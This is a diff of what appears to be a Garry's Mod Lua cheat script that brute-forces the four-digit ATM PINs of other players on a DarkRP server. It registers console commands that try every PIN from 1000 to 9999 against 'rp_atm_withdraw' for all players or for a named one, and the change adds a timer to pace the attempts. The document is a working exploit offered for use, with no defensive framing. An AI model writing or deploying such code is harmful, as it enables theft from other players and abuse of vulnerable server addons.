@@ -5,23 +5,7 @@ Credit to the author must be given when using/sharing this work or derivative wo
 ]]
 
 
-local function bruteforceall( ply, cmd, args )
-	for k, v in pairs(player.GetAll()) do
-		for _, pin in pairs(pintable) do
-			RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[1])
-		end
-	end
-end
 
-local function bruteforceply( ply, cmd , args )
-	for k, v in pairs(player.GetAll()) do
-		if string.lower(v:Name()) == string.lower(args[1]) then
-			for _, pin in pairs(pintable) do
-				RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[2])
-			end
-		end
-	end
-end
 
 local function bruteforce()
 
@@ -43,13 +27,36 @@ for i = 1000, 9999 do
 	table.insert(pintable, i)	
 end
 
+local function bruteforceall( ply, cmd, args )
+	MsgC(Color(0,255,0), "\nBruteforcing...\n")
+	for k, v in pairs(player.GetAll()) do
+		for _, pin in pairs(pintable) do
+			timer.Simple(tonumber(pin)*.015, function()
+			RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[1])
+			end)
+		end
+	end
+end
 
+local function bruteforceply( ply, cmd , args )
+	MsgC(Color(0,255,0), "\nBruteforcing...\n")
+	for k, v in pairs(player.GetAll()) do
+		if string.lower(v:Name()) == string.lower(args[1]) then
+			for _, pin in pairs(pintable) do
+				RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[2])
+			end
+		end
+	end
+end
 
 concommand.Add("lenny_atmbruteforce_all", bruteforceall) --put amount to withdraw as an argument
 
 concommand.Add("lenny_atmbruteforce_ply", bruteforceply) -- put name, then amount to withdraw as arguments
 
+MsgC(Color(0,255,0), "\nInitialzed!!\n")
+
 end
+
 
 
 
